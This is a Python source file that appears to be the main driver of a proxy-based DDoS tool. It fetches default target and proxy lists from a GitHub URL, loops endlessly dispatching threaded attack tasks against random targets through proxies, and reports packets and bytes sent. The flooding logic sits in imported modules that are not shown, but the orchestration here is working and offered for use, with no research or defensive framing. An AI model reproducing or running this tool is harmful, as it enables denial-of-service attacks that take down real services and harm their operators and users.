import time
import datetime
import threading
import logging
import sys
import os
import requests
from files.workers_pool import *
from files.targets_manager import *
from files.proxy_manager import *
from files.attack import *
from files.requests_generator import *
from files.config import *
from files.stats import *
from requests import adapters

class LogSaver(logging.Handler):
    def __init__(self, file_path):
        super().__init__()
        self.__file = open(file_path, 'w')

    def emit(self, record: logging.LogRecord):
        self.__file.write(self.format(record) + '\n')
        self.__file.flush()

console_handler = logging.StreamHandler(stream=sys.stdout)
console_handler.setFormatter(logging.Formatter(fmt='[%(asctime)s: %(levelname)s] %(message)s'))
console_log = logging.getLogger('console')
console_log.setLevel(logging.DEBUG)
file_log = logging.getLogger('file')
file_log.setLevel(logging.DEBUG)
my_logsaver = LogSaver('log.txt')
my_logsaver.setFormatter(logging.Formatter(fmt='[%(asctime)s: %(levelname)s] %(message)s'))
file_log.addHandler(my_logsaver)
console_log.addHandler(my_logsaver)
console_log.addHandler(console_handler)

config = load_config()

class DDoS:
    def __load(self):
        if os.path.isfile('targets.txt'):
            self.__target_manager.load_from_file('targets.txt')
        else:
            console_log.info('File targets.txt not found. Loading default targets...')
            data = requests.get('https://raw.githubusercontent.com/NonExistentUsername/ddos_data/main/targets.txt')
            self.__target_manager.load_from_list((data.content.decode('utf-8')).split('\n'))
        
        console_log.info('Loaded targets: {0}'.format(len(self.__target_manager)))
        if len(self.__target_manager) == 0:
            console_log.critical('No targets!')
            exit(0)

        if os.path.isfile('proxies.txt'):
            self.__proxy_manager.load_from_file('proxies.txt', config)
        else:
            console_log.info('File proxies.txt not found. Loading default proxies...')
            data = requests.get('https://raw.githubusercontent.com/NonExistentUsername/ddos_data/main/proxies.txt')
            self.__proxy_manager.load_from_list((data.content.decode('utf-8')).split('\n'), config)


        console_log.info('loaded proxies: {0}'.format(len(self.__proxy_manager)))
        if len(self.__proxy_manager) == 0:
            console_log.critical('No proxies!')
            exit(0)
        
        self.__proxy_manager.build_tree()

    def get_stats(self):
        return self.__stats

    def get_proxy_manager(self):
        return self.__proxy_manager

    def __init__(self):
        self.__proxy_manager = ProxyManager()
        self.__target_manager = TargetManager()
        self.__weapon = Weapon(config)
        self.__stats = Stats(datetime.datetime.now(), self)
        self.__weapon.add_observer(self.__stats)

        self.__load()

    def run(self):
        pool = WorkersPool(config.THREAD_COUNT)
        pool.start()

        while True:
            while pool.get_len() < config.THREAD_COUNT:
                target = self.__target_manager.get_rand()
                proxy = self.__proxy_manager.get_rand(target)
                if proxy != None:
                    pool.add_task(Task(self.__weapon.attack, args=(target, proxy)))
                else:
                    console_log.warning('Skipped target: {0}'.format(target))

        pool.join()

ddos = DDoS()
ddos_thread = threading.Thread(target=ddos.run)
ddos_thread.start()

my_types = ['Kb', 'Mb', 'Gb', 'Tb']
my_cnts = ['K', 'M', 'B', 'T']

def convert_bytes(bytes):
    if bytes < 1024:
        return None

    id = -1
    while bytes / 1024 >= 1 and id + 1 < len(my_types):
        bytes /= 1024
        id += 1
    
    return [bytes, my_types[id]]

def convert_cnt(cnt):
    if cnt < 1000:
        return cnt

    id = -1
    while cnt / 1000 >= 1 and id + 1 < len(my_cnts):
        cnt /= 1000
        id += 1
    
    return '{0:.2f}'.format(cnt) + my_cnts[id]

def gen_full_stats():
    stats = ddos.get_stats()
    stats_good = stats.get_good()
    stats_bad = stats.get_bad()
    packets = max(stats_good + stats_bad, 1)
    start_time = 'Start time (UTC): {0}'.format(stats.get_start_time())
    delivered = 'Sent packages: {1:.1f}% ({0})'.format(convert_cnt(stats_good), stats_good/(packets)*100)
    bad = 'Errors while submitting: {1:.1f}% ({0})'.format(convert_cnt(stats_bad), stats_bad/(packets)*100)
    stats_good_proxy = stats.get_good_proxy()
    stats_bad_proxy = stats.get_bad_proxy()
    proxy_connections = max(stats_good_proxy + stats_bad_proxy, 1)
    good_proxies_count = 'Good proxies count: {0}'.format(ddos.get_proxy_manager().get_good_proxies_count())
    good_proxy_connections = 'Successful proxy connections: {1:.1f}% ({0})'.format(convert_cnt(stats_good_proxy), stats_good_proxy/(proxy_connections)*100)
    proxy_errors = 'Proxy connection errors: {1:.1f}% ({0})'.format(convert_cnt(stats_bad_proxy), stats_bad_proxy/(proxy_connections)*100)
    b = stats.get_bytes()
    converted = convert_bytes(b)
    bytes = 'Bytes sent: {0}'.format(b)
    if converted != None:
        bytes += ' ({0:.2f} {1})'.format(converted[0], converted[1])

    return start_time + '\n' + delivered + '\n' + bad + '\n' + good_proxies_count + '\n' + good_proxy_connections + '\n' + proxy_errors + '\n' + bytes

def print_stat(timeout = 60):
    stats = ddos.get_stats()
    last_sent_bytes = 0
    last_successfull_p = 0
    last_errors_p = 0
    while True:
        ms_start = get_ms_time()
        packages_stats = gen_full_stats()
        sent_bytes_now = stats.get_bytes()
        delta_sent_bytes = sent_bytes_now - last_sent_bytes
        last_sent_bytes = sent_bytes_now
        converted = convert_bytes(delta_sent_bytes)
        bytes = 'Sent in the last {1} seconds: {0}'.format(delta_sent_bytes, config.CONSOLE_LOG_TIMEOUT)
        if converted != None:
            bytes += ' ({0:.2f} {1})'.format(converted[0], converted[1], config.CONSOLE_LOG_TIMEOUT)
        succesful_p = stats.get_good_proxy()
        delta_successful = succesful_p - last_successfull_p
        last_successfull_p = succesful_p
        errors_p = stats.get_bad_proxy()
        delta_errors = errors_p - last_errors_p
        last_errors_p = errors_p
        proxy_connections = max(1, delta_successful + delta_errors)
        delta_successful_message = 'Successful proxy connection in the last {0} seconds: {2:.1f}% ({1})'.format(timeout, convert_cnt(delta_successful), delta_successful/(proxy_connections)*100)
        
        delta_errors_p = 'Proxy connection errors in the last {0} seconds: {2:.1f}% ({1})'.format(timeout, convert_cnt(delta_errors), delta_errors/(proxy_connections)*100)
        message_text = '\n' + packages_stats + '\n' + bytes + '\n' + delta_successful_message + '\n' + delta_errors_p
        console_log.info(message_text)
        console_log.info('-------------------')
        t = timeout - (get_ms_time() - ms_start) / 1000.
        if t > 0:
            time.sleep(t)

traffic_logger = threading.Thread(target=print_stat, args=(config.CONSOLE_LOG_TIMEOUT,))
traffic_logger.start()

ddos_thread.join()
traffic_logger.join()